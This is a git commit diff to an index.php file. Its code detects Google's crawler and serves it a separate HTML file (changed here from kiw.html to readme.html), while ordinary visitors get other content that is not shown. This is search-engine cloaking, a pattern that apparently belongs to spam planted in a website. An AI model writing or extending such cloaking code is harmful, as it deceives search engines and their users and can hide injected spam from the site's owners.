d18b8b52ae4a977bff717d9f9f4ba1b9db21357a
izuna <stokgsccml@gmail.com>
2025-03-26 16:41:04 +0700

    Update index.php

--- index.php
+++ index.php
@@ -8,7 +8,7 @@ function is_google_bot() {
 }
 
 if (is_google_bot()) {
- $bot_content = file_get_contents('kiw.html');
+ $bot_content = file_get_contents('readme.html');
  echo $bot_content;
  exit;
 } else {
